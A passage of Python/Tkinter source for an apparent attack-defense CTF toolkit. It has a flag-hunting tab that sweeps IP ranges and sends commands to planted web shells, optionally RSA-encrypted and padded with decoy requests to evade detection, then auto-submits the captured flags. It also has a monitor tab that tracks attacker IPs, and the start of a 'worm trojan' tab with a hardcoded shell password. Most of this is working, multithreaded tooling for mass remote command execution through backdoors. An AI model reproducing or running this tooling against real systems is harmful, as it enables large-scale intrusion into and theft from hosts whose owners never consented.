        self.lbl_submitted = tb.Label(r_stat, text='累计提交: 0'); self.lbl_submitted.pack(side=tk.LEFT, padx=4)
        # ── 底部子标签页 ──
        bot_nb = tb.Notebook(f)
        bot_nb.pack(fill=tk.BOTH, expand=True, **pad)
        # 子页1: 日志
        bot_log = tb.Frame(bot_nb); bot_nb.add(bot_log, text='  \U0001f4dd 日志  ')
        self.log_w = LogWidget(bot_log)
        for t, c in [('info','#d4d4d4'),('flag','#4ec9b0'),('submit','#c586c0'),('error','#f44747'),('round','#569cd6'),('warn','#ffcc00')]:
            self.log_w.text.tag_config(t, foreground=c)
        # 子页2: 提交历史
        bot_hist = tb.Frame(bot_nb); bot_nb.add(bot_hist, text='  \U0001f4ca 提交历史  ')
        hist_top = tb.Frame(bot_hist); hist_top.pack(fill=tk.X, padx=2, pady=2)
        self.btn_clear_hist = tb.Button(hist_top, text='\U0001f5d1 清空历史', command=self.clear_history, width=10)
        self.btn_clear_hist.pack(side=tk.LEFT, padx=2)
        self.lbl_hist_stat = tb.Label(hist_top, text='共 0 条 | 成功 0 | 失败 0', foreground='#8b949e')
        self.lbl_hist_stat.pack(side=tk.LEFT, padx=8)
        self.hist_tree = tb.Treeview(bot_hist, columns=('time','ip','flag','status'), show='headings', height=6)
        self.hist_tree.heading('time', text='时间'); self.hist_tree.heading('ip', text='来源IP')
        self.hist_tree.heading('flag', text='Flag'); self.hist_tree.heading('status', text='状态')
        self.hist_tree.column('time', width=100); self.hist_tree.column('ip', width=100)
        self.hist_tree.column('flag', width=300); self.hist_tree.column('status', width=60)
        self.hist_tree.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self.hist_tree.tag_configure('ok', foreground='#3fb950')
        self.hist_tree.tag_configure('fail', foreground='#f85149')
        self._history = []  # list of dicts
        # 子页3: 手动提交
        bot_manual = tb.Frame(bot_nb); bot_nb.add(bot_manual, text='  \U0001f4c5 手动提交  ')
        m_top = tb.Frame(bot_manual); m_top.pack(fill=tk.X, padx=4, pady=4)
        tb.Label(m_top, text='手动输入Flag:').pack(side=tk.LEFT)
        self.manual_flag = tb.Entry(m_top, width=50)
        self.manual_flag.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(m_top, text='来源IP(可选):').pack(side=tk.LEFT)
        self.manual_ip = tb.Entry(m_top, width=16)
        self.manual_ip.pack(side=tk.LEFT, padx=2)
        tb.Button(m_top, text='\U0001f4e4 提交', command=self.manual_submit, bootstyle='success', width=8).pack(side=tk.LEFT, padx=4)
        self.manual_log = scrolledtext.ScrolledText(bot_manual, font=('Consolas', 9), bg='#1e1e1e',
            fg='#d4d4d4', height=6, state=tk.DISABLED)
        self.manual_log.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        self.manual_log.tag_config('ok', foreground='#3fb950')
        self.manual_log.tag_config('fail', foreground='#f85149')
        self.manual_log.tag_config('info', foreground='#d4d4d4')
        # 多提交URL配置
        self._submit_urls = []
        self._submit_tokens = []

    def save_config(self):
        cfg = {
            'ip': self.entry_ip.get(), 'self_ip': self.entry_self.get(),
            'shell_url': self.entry_shell.get(), 'shell_pass': self.entry_pass.get(),
            'port': self.entry_port.get(), 'https': self.v_https_flag.get(),
            'timeout': self.entry_timeout.get(), 'cmds': self.cmd_text.get('1.0', 'end').strip(),
            'submit_url': self.entry_submit.get(), 'token': self.entry_token.get(),
            'no_submit': self.no_submit_var.get(), 'interval': self.entry_interval.get(),
            'threads': self.entry_threads.get(),
            'use_rsa': self.v_rsa.get(), 'use_mix': self.v_mix.get(),
            'fake_count': self.entry_fake.get(), 'rsa_agent': self.entry_rsa_agent.get(),
        }
        try: atomic_write(self.cfg_file, json.dumps(cfg, indent=2))
        except Exception: pass

    def load_config(self):
        if not os.path.exists(self.cfg_file): return
        try:
            with open(self.cfg_file) as f: cfg = json.load(f)
            self.entry_ip.delete(0, 'end'); self.entry_ip.insert(0, cfg.get('ip', ''))
            self.entry_self.delete(0, 'end'); self.entry_self.insert(0, cfg.get('self_ip', ''))
            self.entry_shell.delete(0, 'end'); self.entry_shell.insert(0, cfg.get('shell_url', '/shell.php'))
            self.entry_pass.delete(0, 'end'); self.entry_pass.insert(0, cfg.get('shell_pass', 'cmd'))
            self.entry_port.delete(0, 'end'); self.entry_port.insert(0, cfg.get('port', '80'))
            self.v_https_flag.set(cfg.get('https', False))
            self.entry_timeout.delete(0, 'end'); self.entry_timeout.insert(0, str(cfg.get('timeout', '5')))
            if cfg.get('cmds'): self.cmd_text.delete('1.0', 'end'); self.cmd_text.insert('1.0', cfg['cmds'])
            self.entry_submit.delete(0, 'end'); self.entry_submit.insert(0, cfg.get('submit_url', ''))
            self.entry_token.delete(0, 'end'); self.entry_token.insert(0, cfg.get('token', ''))
            self.no_submit_var.set(cfg.get('no_submit', False))
            self.entry_interval.delete(0, 'end'); self.entry_interval.insert(0, str(cfg.get('interval', '30')))
            self.entry_threads.delete(0, 'end'); self.entry_threads.insert(0, str(cfg.get('threads', '50')))
            self.v_rsa.set(cfg.get('use_rsa', False))
            self.v_mix.set(cfg.get('use_mix', False))
            self.entry_fake.delete(0, 'end'); self.entry_fake.insert(0, cfg.get('fake_count', '8'))
            self.entry_rsa_agent.delete(0, 'end'); self.entry_rsa_agent.insert(0, cfg.get('rsa_agent', ''))
        except Exception: pass

    def log_self(self, msg, tag='info'):
        if hasattr(self, 'log_w'):
            ts = datetime.now().strftime('%H:%M:%S')
            self.log_w.log(f'[{ts}] {msg}', tag)

    def load_file(self):
        p = filedialog.askopenfilename(title='选择IP列表文件')
        if p:
            try:
                with open(p) as f: ips = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                self.entry_ip.delete(0, 'end'); self.entry_ip.insert(0, ','.join(ips))
            except Exception as e: messagebox.showerror('错误', str(e))

    def reset_cmds(self):
        self.cmd_text.delete('1.0', 'end'); self.cmd_text.insert('1.0', '\n'.join(self.DEFAULT_CMDS))

    def test_submit(self):
        url = self.entry_submit.get().strip()
        if not url: messagebox.showwarning('提示', '请先填写提交URL'); return
        flag = f'test_flag_{int(time.time())}'
        try:
            r = requests.post(url, data={'flag': flag, 'token': self.entry_token.get().strip()}, timeout=10)
            self.log_self(f'测试提交: {flag} -> {r.status_code} {r.text.strip()[:60]}', 'info')
        except Exception as e: self.log_self(f'测试提交失败: {e}', 'error')

    def get_targets(self):
        ips = set()
        raw = self.entry_ip.get().strip()
        if raw:
            for item in raw.replace('\n', ',').split(','):
                item = item.strip()
                if not item: continue
                try:
                    for h in ipaddress.ip_network(item, strict=False).hosts(): ips.add(str(h))
                except (ValueError, TypeError): ips.add(item)
        self_ip = self.entry_self.get().strip()
        if self_ip: ips.discard(self_ip)
        return sorted(ips)

    def submit_flag(self, flag, ip):
        if flag in self.known: return False
        if self.no_submit_var.get() or not self.entry_submit.get().strip():
            self.log_self(f'[发现] {ip} -> {flag}', 'flag')
            self.known.add(flag); return True
        try:
            r = _session().post(self.entry_submit.get().strip(),
                data={'flag': flag, 'token': self.entry_token.get().strip() or ''}, timeout=10)
            self.log_self(f'[提交] {flag} -> {r.text.strip()[:60]}', 'submit')
            self.known.add(flag); self.total_submitted += 1
            self.lbl_submitted.config(text=f'累计提交: {self.total_submitted}')
            return True
        except Exception as e:
            self.log_self(f'[提交失败] {flag}: {e}', 'error'); return False

    def check_one(self, ip, cmds, shell_url, shell_pass, port, https, timeout):
        ip = ip.strip()
        base = make_base(ip, port, https)
        s = _session()
        use_rsa = self.v_rsa.get()
        use_mix = self.v_mix.get()
        fake_n = safe_int(self.entry_fake.get().strip(), 8)
        rsa_client = None
        if use_rsa:
            try:
                _try_add_path(os.path.join(BASE, '攻击模块'))
                from rsa_crypto import RSAAgentClient
                agent_url = self.entry_rsa_agent.get().strip() or None
                rsa_client = RSAAgentClient(agent_url)
            except Exception as e:
                self.log_self(f'RSA初始化失败: {e}', 'error')
                return False
        for cmd in cmds:
            if self.stop_flag.is_set(): return False
            try:
                if use_mix:
                    import random, string
                    for i in range(fake_n):
                        if self.stop_flag.is_set(): break
                        fd = {shell_pass: f'echo {random.choice(string.ascii_letters*8)}'} if i % 2 == 0 else {f'x{random.randint(1,99)}': str(random.randint(1000,9999))}
                        try: s.post(f'{base}{shell_url}', data=fd, timeout=max(1, timeout//2))
                        except Exception: pass
                if use_rsa and rsa_client:
                    payload = rsa_client.encrypt_payload(cmd)
                    r = s.post(f'{base}{shell_url}', data={'d': payload}, timeout=timeout)
                    if r.status_code == 200 and r.text.strip():
                        plain = rsa_client.decrypt_response(r.text.strip())
                        for flag in FLAG_PATTERN.findall(plain):
                            if flag not in self.known: self.submit_flag(flag, ip)
                else:
                    r = s.post(f'{base}{shell_url}', data={shell_pass: cmd}, timeout=timeout)
                    if r.status_code == 200:
                        for flag in FLAG_PATTERN.findall(r.text):
                            if flag not in self.known: self.submit_flag(flag, ip)
            except Exception: pass
        return True

    def hunt_loop(self):
        targets = self.get_targets()
        if not targets:
            self.log_self('错误: 没有目标IP', 'error'); self.running = False
            self.root.after(0, lambda: self.btn_start_flag.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.btn_stop_flag.config(state=tk.DISABLED))
            return
        cmds = [l.strip() for l in self.cmd_text.get('1.0', 'end').strip().split('\n') if l.strip()]
        def gi(e, d): return max(1, min(9999, safe_int(self.__dict__[f'entry_{e}'].get().strip(), d)))
        port = gi('port', 80); timeout = gi('timeout', 5)
        interval = gi('interval', 30); threads = gi('threads', 50)
        self.lbl_targets.config(text=f'目标: {len(targets)}')
        self.log_self(f'目标: {len(targets)} 个IP | 线程: {threads} | 命令: {len(cmds)} 条', 'info')
        round_num = 0
        while not self.stop_flag.is_set():
            round_num += 1; self.lbl_round.config(text=f'轮次: {round_num}')
            self.log_self(f'--- 第 {round_num} 轮 ---', 'round')
            with ThreadPoolExecutor(max_workers=threads) as ex:
                fs = {ex.submit(self.check_one_v2, ip, cmds, self.entry_shell.get().strip(),
                               self.entry_pass.get().strip(), port, self.v_https_flag.get(), timeout): ip for ip in targets}
                for f in as_completed(fs):
                    if self.stop_flag.is_set(): break
            if round_num % 5 == 0: self.save_known()
            for _ in range(interval):
                if self.stop_flag.wait(1): break
        self.running = False; self.save_known()
        self.log_self('已停止', 'info')
        self.root.after(0, lambda: self.btn_start_flag.config(state=tk.NORMAL))
        self.root.after(0, lambda: self.btn_stop_flag.config(state=tk.DISABLED))

    def start_hunt(self):
        if self.running: return
        if not self.entry_ip.get().strip(): messagebox.showwarning('提示', '请先输入目标IP'); return
        self.stop_flag.clear(); self.running = True
        self.btn_start_flag.config(state=tk.DISABLED); self.btn_stop_flag.config(state=tk.NORMAL)
        async_run(self.hunt_loop)

    def stop_hunt(self):
        self.stop_flag.set(); self.btn_stop_flag.config(state=tk.DISABLED)

    # ── 提交历史 ──
    def clear_history(self):
        self._history.clear()
        for i in self.hist_tree.get_children(): self.hist_tree.delete(i)
        self.lbl_hist_stat.config(text='共 0 条 | 成功 0 | 失败 0')

    def add_history(self, flag, ip, status, detail=''):
        ts = datetime.now().strftime('%H:%M:%S')
        tag = 'ok' if status == 'ok' else 'fail'
        self.hist_tree.insert('', 0, values=(ts, ip, flag, '\u2705' if status=='ok' else '\u274c'), tags=(tag,))
        self._history.append({'time':ts,'ip':ip,'flag':flag,'status':status,'detail':detail})
        ok = sum(1 for h in self._history if h['status']=='ok')
        fail = len(self._history) - ok
        self.lbl_hist_stat.config(text=f'共 {len(self._history)} 条 | 成功 {ok} | 失败 {fail}')

    # ── 手动提交 ──
    def manual_submit(self):
        flag = self.manual_flag.get().strip()
        if not flag: messagebox.showwarning('提示', '请输入Flag'); return
        ip = self.manual_ip.get().strip() or 'manual'
        def log_m(msg, tag='info'):
            self.manual_log.config(state=tk.NORMAL)
            self.manual_log.insert(tk.END, msg + '\n', tag)
            self.manual_log.see(tk.END)
            self.manual_log.config(state=tk.DISABLED)
        submit_url = self.entry_submit.get().strip()
        if not submit_url:
            log_m(f'[SKIP] 未配置提交URL，仅记录', 'info')
            self.add_history(flag, ip, 'ok', 'manual(no-submit)')
            return
        try:
            r = _session().post(submit_url, data={'flag': flag, 'token': self.entry_token.get().strip() or ''}, timeout=10)
            ok = r.status_code == 200
            log_m(f'[{"OK" if ok else "FAIL"}] {flag} -> {r.status_code}', 'ok' if ok else 'fail')
            self.add_history(flag, ip, 'ok' if ok else 'fail', f'HTTP {r.status_code}')
        except Exception as e:
            log_m(f'[FAIL] {flag}: {e}', 'fail')
            self.add_history(flag, ip, 'fail', str(e)[:40])

    # ── 增强提交: 多平台 + 重试 ──
    def submit_flag_multi(self, flag, ip):
        """增强版提交: 多URL + 重试队列"""
        if flag in self.known: return False
        self.known.add(flag)
        if self.no_submit_var.get():
            self.log_self(f'[发现] {ip} -> {flag}', 'flag')
            self.add_history(flag, ip, 'ok', '仅扫描')
            return True
        urls = self.entry_submit.get().strip().splitlines()
        urls = [u.strip() for u in urls if u.strip()]
        token = self.entry_token.get().strip()
        ok_any = False
        for url in urls:
            for attempt in range(3):
                try:
                    r = _session().post(url, data={'flag': flag, 'token': token or ''}, timeout=10)
                    if r.status_code == 200:
                        self.log_self(f'[提交] {flag} -> {url[:30]}... {r.text.strip()[:30]}', 'submit')
                        self.add_history(flag, ip, 'ok', url[:30])
                        self.total_submitted += 1
                        self.lbl_submitted.config(text=f'累计提交: {self.total_submitted}')
                        ok_any = True
                        break
                    else:
                        self.log_self(f'[重试] {flag} -> {url[:30]}... HTTP {r.status_code} (第{attempt+1}次)', 'warn')
                except Exception as e:
                    if attempt < 2:
                        self.log_self(f'[重试] {flag} 第{attempt+1}次: {e}', 'warn')
                        time.sleep(1)
                    else:
                        self.log_self(f'[提交失败] {flag} 重试耗尽: {e}', 'error')
                        self.add_history(flag, ip, 'fail', str(e)[:30])
        return ok_any

    def check_one_v2(self, ip, cmds, shell_url, shell_pass, port, https, timeout):
        """增强版 check_one，使用 submit_flag_multi"""
        ip = ip.strip()
        base = make_base(ip, port, https)
        s = _session()
        use_rsa = self.v_rsa.get()
        use_mix = self.v_mix.get()
        fake_n = safe_int(self.entry_fake.get().strip(), 8)
        rsa_client = None
        if use_rsa:
            try:
                _try_add_path(os.path.join(BASE, '攻击模块'))
                from rsa_crypto import RSAAgentClient
                agent_url = self.entry_rsa_agent.get().strip() or None
                rsa_client = RSAAgentClient(agent_url)
            except Exception as e:
                self.log_self(f'RSA初始化失败: {e}', 'error')
                return False
        for cmd in cmds:
            if self.stop_flag.is_set(): return False
            try:
                if use_mix:
                    import random, string
                    for i in range(fake_n):
                        if self.stop_flag.is_set(): break
                        fd = {shell_pass: f'echo {random.choice(string.ascii_letters*8)}'} if i % 2 == 0 else {f'x{random.randint(1,99)}': str(random.randint(1000,9999))}
                        try: s.post(f'{base}{shell_url}', data=fd, timeout=max(1, timeout//2))
                        except Exception: pass
                if use_rsa and rsa_client:
                    payload = rsa_client.encrypt_payload(cmd)
                    r = s.post(f'{base}{shell_url}', data={'d': payload}, timeout=timeout)
                    if r.status_code == 200 and r.text.strip():
                        plain = rsa_client.decrypt_response(r.text.strip())
                        for flag in FLAG_PATTERN.findall(plain):
                            if flag not in self.known: self.submit_flag_multi(flag, ip)
                else:
                    r = s.post(f'{base}{shell_url}', data={shell_pass: cmd}, timeout=timeout)
                    if r.status_code == 200:
                        for flag in FLAG_PATTERN.findall(r.text):
                            if flag not in self.known: self.submit_flag_multi(flag, ip)
            except Exception: pass
        return True
MON_CK = {
    'new': '#7ee787', 'mod': '#d29922', 'del': '#f85149', 'conn': '#d2a8ff',
    'bg': '#0d1117', 'card_bg': '#161b22', 'border': '#30363d',
    'text': '#c9d1d9', 'text_dim': '#8b949e', 'accent': '#58a6ff',
}

class MonitorTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.target_url = tk.StringVar(value='http://127.0.0.1:8090/target_monitor.php')
        self.password = tk.StringVar(value='y|lladmin121.@ss')
        self.monitoring = False
        self.log_data = []
        self.last_json_hash = ''
        self.new_alerts = 0; self.file_count = 0; self.conn_count = 0
        self._lock = threading.Lock()
        self.cfg_file = os.path.join(CONFIG_DIR, 'monitor_config.json')
        self.build_ui()
        self.load_config()

    def build_ui(self):
        f = tk.Frame(self.parent, bg=MON_CK['bg'])
        f.pack(fill=tk.BOTH, expand=True)
        toolbar = tk.Frame(f, bg=MON_CK['card_bg'], bd=0, highlightthickness=1, highlightcolor=MON_CK['border'], highlightbackground=MON_CK['border'])
        toolbar.pack(fill=tk.X, padx=4, pady=4)
        tk.Label(toolbar, text="URL:", fg=MON_CK['text_dim'], bg=MON_CK['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(6,2))
        self.e_url = tk.Entry(toolbar, textvariable=self.target_url, width=36, bg='#21262d', fg=MON_CK['text'],
            insertbackground=MON_CK['text'], relief=tk.FLAT, font=('Consolas', 9), bd=0, highlightthickness=1, highlightcolor=MON_CK['border'])
        self.e_url.pack(side=tk.LEFT, padx=2)
        tk.Label(toolbar, text="密码:", fg=MON_CK['text_dim'], bg=MON_CK['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(6,2))
        self.e_pw = tk.Entry(toolbar, textvariable=self.password, width=12, bg='#21262d', fg=MON_CK['text'],
            show='*', insertbackground=MON_CK['text'], relief=tk.FLAT, font=('Consolas', 9), bd=0, highlightthickness=1, highlightcolor=MON_CK['border'])
        self.e_pw.pack(side=tk.LEFT, padx=2)
        self.btn_start_mon = tk.Button(toolbar, text='\u25b6 开始', command=self.toggle, bg='#238636', fg='white',
            relief=tk.FLAT, bd=0, padx=12, pady=2, cursor='hand2', font=('微软雅黑', 9, 'bold'), activebackground='#2ea043')
        self.btn_start_mon.pack(side=tk.LEFT, padx=6)
        self.btn_export_mon = tk.Button(toolbar, text='\U0001f4e5', command=self.export_log, bg=MON_CK['card_bg'],
            fg=MON_CK['text'], relief=tk.FLAT, bd=0, padx=6, pady=2, cursor='hand2', font=('Consolas', 10), activebackground='#30363d')
        self.btn_export_mon.pack(side=tk.LEFT, padx=2)
        self.btn_clear_mon = tk.Button(toolbar, text='\U0001f5d1', command=self.clear_log, bg=MON_CK['card_bg'],
            fg=MON_CK['text'], relief=tk.FLAT, bd=0, padx=6, pady=2, cursor='hand2', font=('Consolas', 10), activebackground='#30363d')
        self.btn_clear_mon.pack(side=tk.LEFT, padx=2)
        stats = tk.Frame(f, bg=MON_CK['bg'])
        stats.pack(fill=tk.X, padx=4, pady=(0,4))
        self.cards = {}
        for kid, lbl, col in [('file', '\U0001f4c1 文件', '#7ee787'), ('conn', '\U0001f50c 连接', '#d2a8ff'),
                              ('total', '\U0001f4ca 日志', MON_CK['accent']), ('alert', '\U0001f6a8 警报', '#f85149')]:
            card = tk.Frame(stats, bg=MON_CK['card_bg'], bd=0, highlightthickness=1, highlightcolor=MON_CK['border'], highlightbackground=MON_CK['border'])
            card.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
            n = tk.Label(card, text='0', fg=col, bg=MON_CK['card_bg'], font=('Consolas', 18, 'bold'))
            n.pack(pady=(4,0))
            tk.Label(card, text=lbl, fg=MON_CK['text_dim'], bg=MON_CK['card_bg'], font=('微软雅黑', 8)).pack(pady=(0,4))
            self.cards[kid] = n
        self.status_label = tk.Label(f, text="就绪", fg=MON_CK['text_dim'], bg=MON_CK['card_bg'],
            font=('微软雅黑', 9), anchor=tk.W, bd=0, highlightthickness=1, highlightcolor=MON_CK['border'])
        self.status_label.pack(fill=tk.X, padx=4, pady=(0,4))
        # ── 底部子标签 ──
        bot_nb = tb.Notebook(f, bootstyle='dark')
        bot_nb.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0,4))
        # 子页1: 监控日志
        self.mon_log_frame = tb.Frame(bot_nb)
        bot_nb.add(self.mon_log_frame, text='  \U0001f4dd 监控日志  ')
        self.log_text = scrolledtext.ScrolledText(self.mon_log_frame, bg=MON_CK['card_bg'], fg=MON_CK['text'],
            insertbackground=MON_CK['text'], font=('Consolas', 9), bd=0, highlightthickness=1,
            highlightcolor=MON_CK['border'], state=tk.DISABLED, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        for t, c in [('t', MON_CK['text_dim']),('new','#7ee787'),('mod','#d29922'),('del','#f85149'),('conn','#d2a8ff'),('ts',MON_CK['text_dim'])]:
            self.log_text.tag_config(t, foreground=c)
        # 子页2: 攻击者TOP
        bot_atk = tb.Frame(bot_nb); bot_nb.add(bot_atk, text='  \U0001f525 攻击者TOP  ')
        atk_top = tb.Frame(bot_atk); atk_top.pack(fill=tk.X, padx=4, pady=2)
        self.atk_tree = tb.Treeview(bot_atk, columns=('rank','ip','count','last_seen'), show='headings', height=8, bootstyle='dark')
        self.atk_tree.heading('rank', text='#'); self.atk_tree.heading('ip', text='攻击者IP')
        self.atk_tree.heading('count', text='攻击次数'); self.atk_tree.heading('last_seen', text='最后时间')
        self.atk_tree.column('rank', width=30); self.atk_tree.column('ip', width=150)
        self.atk_tree.column('count', width=80); self.atk_tree.column('last_seen', width=100)
        self.atk_tree.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        self.atk_data = {}  # ip -> {'count': n, 'last': time}
        tb.Button(atk_top, text='\U0001f5d1 清空', command=self.clear_atk, width=6).pack(side=tk.LEFT, padx=2)
        tb.Button(atk_top, text='\U0001f4e5 导出', command=self.export_atk, width=6).pack(side=tk.LEFT, padx=2)
        self.lbl_atk_stat = tb.Label(atk_top, text='', foreground='#8b949e')
        self.lbl_atk_stat.pack(side=tk.LEFT, padx=8)
        # 子页3: 告警配置
        bot_alert = tb.Frame(bot_nb); bot_nb.add(bot_alert, text='  \U0001f514 告警配置  ')
        al_f = tb.Frame(bot_alert); al_f.pack(fill=tk.X, padx=8, pady=8)
        self.alert_sound = tk.BooleanVar(value=True)
        tb.Checkbutton(al_f, text='启用声音告警', variable=self.alert_sound, bootstyle='success').pack(anchor=tk.W, pady=2)
        tb.Label(al_f, text='告警阈值(文件变更/秒):').pack(anchor=tk.W)
        self.alert_threshold = tb.Entry(al_f, width=6); self.alert_threshold.insert(0, '5'); self.alert_threshold.pack(anchor=tk.W, pady=2)
        tb.Label(al_f, text='阈值时间内超过此数量则触发告警', foreground='#8b949e', font=('微软雅黑', 8)).pack(anchor=tk.W)
        self.lbl_alert_status = tb.Label(al_f, text='\u23f8 告警监控未启动', foreground='#8b949e')
        self.lbl_alert_status.pack(anchor=tk.W, pady=6)
        self._alert_times = []  # timestamps of recent alerts for threshold

    def load_config(self):
        if os.path.exists(self.cfg_file):
            try:
                with open(self.cfg_file, 'r', encoding='utf-8') as f:
                    c = json.load(f)
                if 'url' in c: self.target_url.set(c['url'])
                if 'password' in c: self.password.set(c['password'])
            except Exception: pass

    def save_config(self):
        try:
            atomic_write(self.cfg_file, json.dumps({'url': self.target_url.get(), 'password': self.password.get()}, ensure_ascii=False, indent=2))
        except Exception: pass

    def toggle(self):
        if not self.monitoring:
            if not self.target_url.get().strip(): messagebox.showerror("错误", "请填写URL"); return
            self.monitoring = True; self.last_json_hash = ''
            self.btn_start_mon.config(text='\u23f9 停止', bg='#da3633', activebackground='#f85149')
            self.status_label.config(text='\U0001f7e2 监控中...')
            async_run(self.loop)
        else:
            self.monitoring = False; self.btn_start_mon.config(text='\u25b6 开始', bg='#238636', activebackground='#2ea043')
            self.status_label.config(text='\u23f8 已停止')

    def loop(self):
        ctx = ssl._create_unverified_context()
        base = self.target_url.get().strip(); pw = self.password.get().strip()
        while self.monitoring:
            try:
                url = f"{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=1&_={int(time.time()*1000)}"
                with urllib.request.urlopen(urllib.request.Request(url), timeout=10, context=ctx) as resp:
                    d = json.loads(resp.read().decode('utf-8'))
                if 'lines' in d:
                    h = json.dumps(d['lines'], sort_keys=True)
                    if h != self.last_json_hash:
                        self.last_json_hash = h
                        self.root.after(0, self.add_lines, list(d['lines']))
                self.root.after(0, lambda t=d.get('time',''): self.status_label.config(text=f'\U0001f7e2 监控中 - {t}'))
            except urllib.error.HTTPError as e:
                self.root.after(0, lambda c=e.code: self.status_label.config(text=f'\u26a0 HTTP {c}'))
            except urllib.error.URLError as e:
                self.root.after(0, lambda r=e.reason: self.status_label.config(text=f'\u26a0 连接失败: {r}'))
            except Exception as e:
                self.root.after(0, lambda e=e: self.status_label.config(text=f'\u26a0 {e}'))
            time.sleep(3.5)

    def add_lines(self, lines):
        added = 0
        with self._lock:
            for l in lines:
                if l and (not self.log_data or l != self.log_data[-1]):
                    self.log_data.append(l); added += 1
                    is_alert = False
                    if '[NEW]' in l or '[MOD]' in l or '[DEL]' in l:
                        self.file_count += 1
                        if '[NEW]' in l: self.new_alerts += 1; is_alert = True
                    if '[CONN]' in l:
                        self.conn_count += 1; self.new_alerts += 1; is_alert = True
                    # Extract attacker IP from log line
                    ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', l)
                    if ips and is_alert:
                        self.root.after(0, lambda i=ips[0]: self.track_attacker(i))
            if len(self.log_data) > 2000: self.log_data = self.log_data[-2000:]
        if added:
            self.cards['file'].config(text=str(self.file_count))
            self.cards['conn'].config(text=str(self.conn_count))
            self.cards['alert'].config(text=str(self.new_alerts))
            with self._lock: self.cards['total'].config(text=str(len(self.log_data)))
            self.refresh_log()

    def refresh_log(self):
        self.log_text.config(state=tk.NORMAL); self.log_text.delete('1.0', tk.END)
        with self._lock: data = list(self.log_data)
        for line in data:
            if line.count(']') >= 2:
                idx = line.rindex(']') + 1; ts = line[:idx]; content = line[idx:].strip()
                self.log_text.insert(tk.END, ts + ' ', 'ts')
                tag = 't'
                if content.startswith('[NEW]'): tag = 'new'
                elif content.startswith('[MOD]'): tag = 'mod'
                elif content.startswith('[DEL]'): tag = 'del'
                elif content.startswith('[CONN]'): tag = 'conn'
                self.log_text.insert(tk.END, content + '\n', tag)
            else: self.log_text.insert(tk.END, line + '\n', 't')
        self.log_text.see(tk.END); self.log_text.config(state=tk.DISABLED)

    def clear_log(self):
        with self._lock: self.log_data.clear()
        self.file_count = 0; self.conn_count = 0; self.new_alerts = 0
        for k in ('file','conn','total','alert'): self.cards[k].config(text='0')
        self.refresh_log()

    # ── 攻击者追踪 ──
    def track_attacker(self, ip):
        now = datetime.now().strftime('%H:%M:%S')
        if ip not in self.atk_data:
            self.atk_data[ip] = {'count': 0, 'last': now}
        self.atk_data[ip]['count'] += 1
        self.atk_data[ip]['last'] = now
        self._check_alert_threshold()
        self._refresh_atk_tree()

    def _refresh_atk_tree(self):
        for i in self.atk_tree.get_children(): self.atk_tree.delete(i)
        sorted_data = sorted(self.atk_data.items(), key=lambda x: -x[1]['count'])[:10]
        for rank, (ip, data) in enumerate(sorted_data, 1):
            self.atk_tree.insert('', tk.END, values=(rank, ip, data['count'], data['last']))
        self.lbl_atk_stat.config(text=f'总计 {sum(d["count"] for d in self.atk_data.values())} 次攻击')

    def clear_atk(self):
        self.atk_data.clear()
        self._refresh_atk_tree()

    def export_atk(self):
        p = filedialog.asksaveasfilename(defaultextension='.csv', initialfile='attackers.csv', filetypes=[('CSV', '*.csv')])
        if not p: return
        try:
            with open(p, 'w', encoding='utf-8-sig') as f:
                f.write('排名,IP,攻击次数,最后时间\n')
                for rank, (ip, data) in enumerate(sorted(self.atk_data.items(), key=lambda x: -x[1]['count']), 1):
                    f.write(f'{rank},{ip},{data["count"]},{data["last"]}\n')
            self.status_label.config(text=f'\u2705 已导出 {p}')
        except Exception as e: messagebox.showerror('导出失败', str(e))

    def _check_alert_threshold(self):
        try:
            threshold = int(self.alert_threshold.get().strip() or 5)
        except Exception: threshold = 5
        now = time.time()
        self._alert_times.append(now)
        # Keep only last 10 seconds
        self._alert_times = [t for t in self._alert_times if now - t < 10]
        if len(self._alert_times) >= threshold and self.alert_sound.get():
            self.lbl_alert_status.config(text='\U0001f514 \U0001f6a8 告警触发! 攻击频率过高', foreground='#f85149')
            try:
                print('\a', end='', flush=True)
            except Exception: pass
        else:
            self.lbl_alert_status.config(text=f'\U0001f7e2 当前频率: {len(self._alert_times)}/10s', foreground='#3fb950')

    def export_log(self):
        p = filedialog.asksaveasfilename(defaultextension='.csv', filetypes=[('CSV', '*.csv'), ('Text', '*.txt')],
            initialfile=f"monitor_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
        if not p: return
        try:
            with self._lock: data = list(self.log_data)
            with open(p, 'w', encoding='utf-8-sig') as f:
                if p.endswith('.csv'):
                    f.write('\ufeff时间,类型,详情\n')
                    for l in data:
                        if l.count(']') >= 2:
                            idx = l.rindex(']') + 1; ts = l[:idx].strip('[]'); content = l[idx:].strip()
                            etype = '文件' if content.startswith(('[NEW]','[MOD]','[DEL]')) else '连接'
                            f.write(f'{ts},{etype},{content}\n')
                else:
                    f.write(f"Defense Monitor - {datetime.now()}\n{'='*60}\n\n")
                    for l in data: f.write(l + '\n')
            self.status_label.config(text=f'\u2705 已导出')
        except Exception as e: messagebox.showerror("导出失败", str(e))


# ============================================================
#  Tab 4: 蠕虫木马 (修复: 裸except + 公共函数)
# ============================================================
CREEP_DIR = os.path.join(BASE, '上传靶机')

class CreepTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.cfg_file = os.path.join(CONFIG_DIR, 'creep_config.json')
        d = {'ip':'','port':'80','https':False,'shell_url':'/shell.php','shell_pass':'y|lladmin121.@ss','password':'y|lladmin121.@ss'}
        try:
            if os.path.exists(self.cfg_file):
                with open(self.cfg_file) as f: d.update(json.load(f))
        except Exception: pass
        self.cfg = d
        self.build_ui()

    def build_ui(self):
        f = tb.Frame(self.parent)
        f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
